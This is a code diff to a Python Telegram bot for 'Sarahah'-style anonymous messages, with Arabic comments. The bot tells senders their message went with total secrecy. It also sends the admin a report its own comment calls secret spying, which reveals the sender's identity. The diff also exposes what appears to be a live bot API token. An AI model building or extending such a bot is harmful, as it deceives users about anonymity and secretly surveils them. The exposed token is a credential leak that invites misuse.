@@ -1,10 +1,10 @@
 import telebot
 import sqlite3
 
-# 1. توكن البوت الخاص بك من BotFather (تم التعديل بنجاح)
+# 1. توكن البوت الخاص بك من BotFather
 API_TOKEN = '8853538663:AAEoQFVkHudDpQG9xtjc2G4aca6Mbm93EqI'
 
-# 2. الآيدي الشخصي تبعك لتصلك التقارير (تم التعديل بنجاح)
+# 2. الآيدي الشخصي تبعك لتصلك التقارير
 ADMIN_ID = 8820368378
 
 bot = telebot.TeleBot(API_TOKEN)
@@ -39,7 +39,7 @@ def handle_start(message):
     conn.commit()
     conn.close()
 
-    # إذا دخل عن طريق رابط صراحة لشخص آخر (مثال: /start 1234567)
+    # إذا دخل عن طريق رابط صراحة لشخص آخر
     if len(text) > 1:
         target_id = text[1]
         if str(target_id) == str(chat_id):
@@ -84,7 +84,7 @@ def send_sarahni_message(message, target_id):
     target_name = target_data[1] if target_data else "مستخدم مسجل"
     target_username = f"@{target_data[0]}" if target_data and target_data[0] else "لا يوجد"
 
-    # 1. إرسال الرسالة للمستلم الأصلي (دون كشف الهوية)
+    # 1. إرسال الرسالة للمستلم الأصلي
     try:
         bot.send_message(target_id, f"📥 **وصلتك رسالة صراحة جديدة!**\n━━━━━━━━━━━━━━━━━━━\n💬 {msg_text}", parse_mode='Markdown')
         bot.send_message(sender_id, "تم إرسال رسالتك بنجاح وبسرية تامة! 🤫🔒")
@@ -92,7 +92,7 @@ def send_sarahni_message(message, target_id):
         bot.send_message(sender_id, "❌ حدث خطأ، يبدو أن المستخدم قام بحظر البوت.")
         return
 
-    # 2. إرسال التقرير السري والتجسس لك (الآدمن) 🔥
+    # 2. إرسال التقرير السري والتجسس لك (الآدمن)
     report = (
         f"🕵️‍♂️ **تقرير صراحة جديد:**\n"
         f"━━━━━━━━━━━━━━━━━━━\n"
@@ -109,5 +109,6 @@ def send_sarahni_message(message, target_id):
     except Exception as e:
         print(f"فشل إرسال التقرير: {e}")
 
-# تشغيل البوت
+# تشغيل البوت (تمت إضافة مسح الويب هوك لحل مشكلة التعارض)
+bot.remove_webhook()
 bot.infinity_polling()
